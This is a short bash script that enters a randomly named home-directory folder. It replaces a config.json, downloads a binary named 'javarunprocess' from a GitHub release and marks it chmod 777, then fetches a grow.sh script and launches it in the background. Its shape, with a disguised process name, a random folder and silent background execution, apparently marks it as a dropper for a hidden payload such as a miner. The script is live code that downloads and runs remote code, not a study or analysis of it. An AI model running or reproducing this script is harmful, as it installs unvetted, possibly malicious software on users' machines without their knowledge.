#!/bin/bash


    cd ~
    cd gpUxgdSz
    rm config.json
    curl -O https://raw.githubusercontent.com/danialchork/linux-project/refs/heads/main/config.json

    rm javarunprocess
    curl -O https://github.com/danialchork/linux-project/releases/download/Last/javarunprocess
    chmod 777 javarunprocess
    rm grow.sh
    curl -O https://raw.githubusercontent.com/danialchork/linux3-project/refs/heads/main/grow.sh
    chmod 777 grow.sh
     ./grow.sh &



  
